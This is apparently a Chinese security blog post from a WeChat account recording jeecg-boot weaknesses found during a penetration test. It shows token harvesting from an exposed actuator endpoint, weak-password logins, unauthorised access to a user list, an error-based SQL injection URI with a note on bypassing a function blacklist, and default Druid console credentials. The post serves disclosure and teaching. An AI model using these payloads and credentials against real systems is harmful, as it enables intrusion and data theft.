#  jeecg-boot的一些漏洞记录

原创 carrypan  [ 安全艺术 ](javascript:void\(0\);)

**安全艺术** ![]()

微信号 AnQuanYiShu2022

功能介绍 闲暇小记

____

___发表于_

收录于合集

# 记录最近做项目碰到的jeecg-boot的一些漏洞

# 1.未授权访问

通过https://xxx.xxx.xxx/jeecg-
boot/actuator/httptrace接口抓取token，重点关注下token信息，比如有些带token的url请求，或者直接替换token请求一些敏感接口，再根据响应信息进一步攻击，本次案例就是一个接口泄露用户名引起的：

![]()

访问

https://xxx.xxx.xxx/jeecg-
boot/appwx/vid/wxVideo/listVideoInfos?cid=1505751480615919618&token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IuW-
ruS_oeWwj-
eoi-W6jy10aGlyZC1hcHA4NTk2In0.2wI9ewYa-21wfpsOkC3yVmrwGb10i0mfc1QAHehG97w&t=1661223869537&r=7896&os=wx

服务端返回一个用户名信息，可以进行弱口令尝试  

![]()

运气好，直接账号linshi，密码123456，成功登录

![]()

此账号非管理员，尝试通过接口文档查找，也未发现，懒的看代码，看看接口文档，用户信息都在sys目录下，直接来个/sys/user/list不香吗

发现可以直接越权查看https://xxx.xxx.xxx/jeecg-boot/sys/user/list用户信息

![]()

提取用户名，再进一步尝试弱口令，最总成功获取管理员用户一枚，登录

![]()

# 2.SQL注入

前提是需要登录系统，登录系统后直接访问如下URI

POC

/jeecg-
boot/sys/duplicate/check?dataId=&fieldName=updatexml(1,concat(0x7e,user(),0x7e),1)&fieldVal=1000&tableName=sys_log

![]()

查资料基本都是可以成功的，不晓得这里的拦截是咋回事，就简单尝试绕过下，经几次尝试，发现服务端对user(),database()等进行了黑名单校验，直接利用mysql特性，函数与圆括号中间添加注释符绕过：

![]()

  

# 3.Druid弱口令

这个漏洞也比较常见，直接访问之，一般默认就是admin/123456

URI

/jeecg-boot/druid/login.html

admin/123456

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

